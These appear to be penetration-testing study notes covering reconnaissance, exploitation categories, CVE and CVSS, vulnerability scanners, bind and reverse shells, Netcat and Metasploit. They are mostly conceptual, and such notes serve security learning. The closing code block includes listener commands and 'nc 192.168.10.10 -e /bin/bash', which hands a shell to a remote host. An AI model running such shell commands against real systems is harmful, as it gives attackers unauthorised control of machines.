System Reconnaissance

System reconnaissance involves gathering crucial information about the target network or system to plan attacks effectively.

###  Network Information - Nmap

Nmap is a powerful network scanning tool used to collect the following:

* **Address:** IP address of target devices.
* **Physical & Software Info:** Hardware and OS-level details.
* **Topology:** Network structure and host relationships.

### System Information - Nmap

* **Running Services (Ports):** Identify open and filtered ports.
* **Operating System Detection:** Guess the OS using TCP/IP fingerprinting.

### 👤 User Information - Social Engineering

* **Usernames, Passwords, Hostnames**
  Gathered through:

  * Phishing
  * Open-source intelligence (OSINT)
  * Social media scraping

---

## 💣 Exploitation Techniques

### 1. 🆕 Finding New Vulnerabilities

* Discovering unknown bugs/security flaws.
* **0-Day Vulnerabilities:** No patch exists yet, high risk.

### 2. ♻️ Exploiting Existing Vulnerabilities

* Using publicly known flaws in outdated software.
* Look up CVEs associated with software used by the target.

---

## 🔓 Exploitation Methods

### 1. ⚙️ Protocol Exploitation

* Misconfigured services & open ports.
* **Example:** FTP with anonymous login enabled.

### 2. 🌐 Web Exploits

* Leverage poor **input validation**, **XSS**, **SQLi**, etc.
* Targets web forms, cookies, URLs.

### 3. 💻 System Exploitation

* Attack vectors:

  * **Weak passwords**
  * **Unpatched or outdated software**
  * **Default configurations**

### 4. 🧠 Social Engineering

* Psychological manipulation to gain credentials.
* **Example:** Phishing emails or fake login pages.

---

## 📚 Common Vulnerabilities and Exposures (CVE)

* **CVE**: Publicly disclosed cybersecurity vulnerabilities.
* Each has a unique **CVE ID** (e.g., CVE-2024-1234).
* Tracked by organizations like **MITRE**, **NIST**, and **OffSec**.

### 📊 CVSS – Common Vulnerability Scoring System

Used to evaluate the severity of vulnerabilities:

* Score Range: **0.0 (Low) → 10.0 (Critical)**
* Metrics:

  * **Base Score:** Severity of the vulnerability
  * **Temporal Score:** Evolution of the threat over time
  * **Environmental Score:** Impact in a specific environment

🔗 [CVSS Calculator (Official)](https://www.first.org/cvss/calculator)

---

## 🔎 Where to Find Existing Vulnerabilities?

| Source                | Description                                     |
| --------------------- | ----------------------------------------------- |
| 🔍 **ExploitDB**      | Public archive maintained by **OffSec**.        |
| 🧠 **MITRE Search**   | CVE database with minimal detail.               |
| 💻 **SearchSploit**   | CLI tool to search ExploitDB locally.           |
| 🌐 **Search Engines** | Google known CVEs by software name and version. |

📝 Tip: **Big organizations** don’t focus on 0-days; instead, they identify and patch **known CVEs**.

---

## 🧪 Vulnerability Assessment

**Definition:**
A process to identify, quantify, and prioritize vulnerabilities in a system.

### 🧰 Tools for Vulnerability Assessment

| Tool            | Purpose                                                 |
| --------------- | ------------------------------------------------------- |
| 🛡️ **Nessus**  | Comprehensive vulnerability scanner.                    |
| 🌐 **Acunetix** | Focused on **web vulnerabilities**.                     |
| 🏗️ **OpenVAS** | Open-source vulnerability scanner.                      |
| 📡 **Nmap**     | Scan open ports and OS details.                         |
| 🚀 **Nuclei**   | Fast & flexible vulnerability scanner (install via Go): |

```bash
sudo apt install golang  
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest  
nuclei -u http://example.com
```

⚠️ **Note:** All tools may produce:

* **False Positives** – Reporting a vulnerability that doesn’t exist.
* **False Negatives** – Missing a real vulnerability.

# Remote Access Techniques

After exploiting a system, attackers often aim to get a **shell** on the target machine. Getting a shell enables remote execution of commands, allowing attackers to control the system.

## a. Bind Shell

- A **bind shell** is a setup where the target system opens a specific port and listens for incoming connections.
- The attacker connects to that port to gain remote console access.
- Essentially, the target system "binds" a shell process to a TCP port, waiting for an incoming connection.
- **Bind TCP** means the target system listens on a port, and the attacker initiates the connection to that port.

### How Bind TCP Works
- The attacker connects to the target IP and port.
- Once connected, the attacker gets an interactive shell on the target machine.

---

## b. Reverse Shell

- A **reverse shell** is the opposite of a bind shell.
- Instead of the attacker connecting to the target, the target initiates a connection back to the attacker's machine.
- This leverages vulnerabilities on the target system to make it open a connection to the attacker.
- Reverse shells often bypass firewalls and NAT since outgoing connections from the target are usually allowed.
- Reverse shells are a severe security threat and commonly used during penetration testing.

---

# Netcat (nc)

- **Netcat** is a powerful command-line utility used for reading and writing data across network connections using TCP or UDP protocols.
- Common uses:
  1. **Listening on ports** to wait for incoming connections (acting as a server).
  2. **Creating connections** to remote ports (acting as a client).

# Payloads

* A **payload** is a command or script executed on the target system after exploitation.
* The payload establishes an actual remote connection, allowing the attacker control over the target.
* Payloads vary based on:
  * Operating system
  * Shell type
  * Connection method (bind or reverse)

---

# Reverse Shell Generators

* Tools like [revshells.com](https://www.revshells.com) provide pre-built reverse shell payloads for various languages and environments.
* Useful for quick generation of shell commands in different scripting languages (Python, PHP, Bash, etc.)

---

# Metasploit Framework

* **Metasploit** is a powerful and popular penetration testing framework used to discover and exploit system vulnerabilities.
* Written in **Ruby**.
* Provides a wide variety of modules for scanning, exploitation, payload generation, and post-exploitation.

### Key Components

* **Msfvenom**: A payload generator tool that creates shellcode and executable payloads tailored for various targets.
* **Msfconsole**: The interactive command-line interface for Metasploit used to launch attacks and manage exploits.
* **Msfdb**: Database management system used by Metasploit to store scan results, credentials, and session info.

---

# Payload Formatting

Payloads are often structured in the following way:

* **OS**: Windows, Linux, macOS, etc.
* **Shell Type**:
  * **Shell**: Basic command shell.
  * **Meterpreter**: An advanced and dynamically extensible payload providing many features such as file system access, command execution, and network pivoting.
* **Connection Type**:
  * **Bind**: Target listens, attacker connects.
  * **Reverse**: Target connects back to attacker.

---

### Meterpreter

* A powerful Metasploit payload that provides an interactive shell with many additional features.
* Supports scripting, file uploads/downloads, process migration, keylogging, and more.
* Runs entirely in memory, making it stealthy and harder to detect.

### Common Commands

```bash
# Start listening on port 2222 (verbose, listen mode, specify port)
netcat -lvp 2222

# Connect to target IP 192.168.10.10 and execute /bin/bash to get shell
nc 192.168.10.10 -e /bin/bash

# Start listener on port 12345 (verbose, listen mode, no DNS resolution, specify port)
nc -lvnp 12345

* Ports can be any number from 1 to 65535, but commonly high-numbered ports above 1024 are used for such purposes.









